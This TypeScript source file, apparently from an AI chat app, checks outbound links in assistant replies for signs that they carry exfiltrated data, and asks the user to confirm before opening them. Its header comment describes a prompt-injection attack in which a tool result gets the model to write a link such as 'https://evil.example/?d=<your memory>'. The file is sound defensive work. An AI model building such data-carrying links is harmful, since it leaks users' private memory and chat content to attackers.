// Outbound links in assistant replies: does this one look like it carries data?
// Pure — no Electron, DB or network — so the rule can be tested directly. The
// confirm dialog is main/index.ts's `assistant:openLink`.
//
// A prompt-injected tool result can't make the app fetch anything on its own
// (remote images are rendered as links, web tools ask), but it can get the
// model to write a link like `https://evil.example/?d=<your memory>` and hope
// you click it. So a link the model BUILT is checked before it opens:
//
//  - Its query string + fragment is long (more than MAX_DATA_CHARS once
//    decoded) — nothing a person reads, so likely an encoded payload.
//  - A query value, fragment or path segment of at least MIN_MATCH_CHARS
//    appears in the memory file or in a tool result from this chat.
//
// A link copied verbatim from a tool result or the user's own message is
// exempt: its URL was fixed by whoever wrote it, before your data was in
// front of the model, so it can't be carrying any of it. Deterministic on
// purpose — no model is asked, and the same link always gets the same answer.

export const MAX_DATA_CHARS = 100;
export const MIN_MATCH_CHARS = 12;

export interface LinkContext {
  // The memory file's text.
  memory: string;
  // Tool result payloads from this chat.
  toolResults: string[];
  // The user's own messages (their URLs are trusted; their text isn't checked).
  userMessages: string[];
}

const URL_PATTERN = /https?:\/\/[^\s<>"'`\\]+/g;

function normalise(raw: string): string | null {
  try {
    return new URL(raw.replace(/[.,;:!?)\]]+$/, "")).href;
  } catch {
    return null;
  }
}

function decode(part: string): string {
  const spaced = part.replace(/\+/g, " ");
  try {
    return decodeURIComponent(spaced);
  } catch {
    return spaced;
  }
}

const flatten = (text: string) => text.replace(/\s+/g, " ").trim().toLowerCase();

// A payload's text, plus every string inside it when it is JSON — tool results
// are JSON, where escaping (\n, \") would otherwise split a phrase or hide a URL.
function textsOf(text: string): string[] {
  const out = [text];
  const walk = (value: unknown): void => {
    if (typeof value === "string") out.push(value);
    else if (Array.isArray(value)) value.forEach(walk);
    else if (value && typeof value === "object") Object.values(value).forEach(walk);
  };
  try {
    walk(JSON.parse(text));
  } catch {
    // Not JSON.
  }
  return out;
}

function verbatimUrls(texts: string[]): Set<string> {
  const urls = new Set<string>();
  for (const text of texts.flatMap(textsOf)) {
    for (const hit of text.match(URL_PATTERN) ?? []) {
      const href = normalise(hit);
      if (href) urls.add(href);
    }
  }
  return urls;
}

function quote(text: string): string {
  return text.length > 60 ? `${text.slice(0, 59)}…` : text;
}

// A reason to confirm before opening `href`, or null to open it straight away.
export function outboundLinkWarning(href: string, ctx: LinkContext): string | null {
  let url: URL;
  try {
    url = new URL(href);
  } catch {
    return null;
  }
  if (verbatimUrls([...ctx.toolResults, ...ctx.userMessages]).has(url.href)) return null;

  const data = decode(url.search.slice(1)) + decode(url.hash.slice(1));
  if (data.length > MAX_DATA_CHARS) {
    return `The link's query string is ${data.length} characters long, which can hide data being sent to ${url.host}.`;
  }

  const pieces = [
    ...url.pathname.split("/"),
    ...url.search.slice(1).split("&").flatMap((pair) => pair.split("=")),
    url.hash.slice(1),
  ]
    .map((p) => flatten(decode(p)))
    .filter((p) => p.length >= MIN_MATCH_CHARS);
  if (pieces.length === 0) return null;

  const memory = flatten(ctx.memory);
  const tools = ctx.toolResults.flatMap(textsOf).map(flatten);
  for (const piece of pieces) {
    if (memory.includes(piece)) {
      return `The link contains text from your memory (“${quote(piece)}”), which would be sent to ${url.host}.`;
    }
    if (tools.some((t) => t.includes(piece))) {
      return `The link contains text the assistant read in this chat (“${quote(piece)}”), which would be sent to ${url.host}.`;
    }
  }
  return null;
}
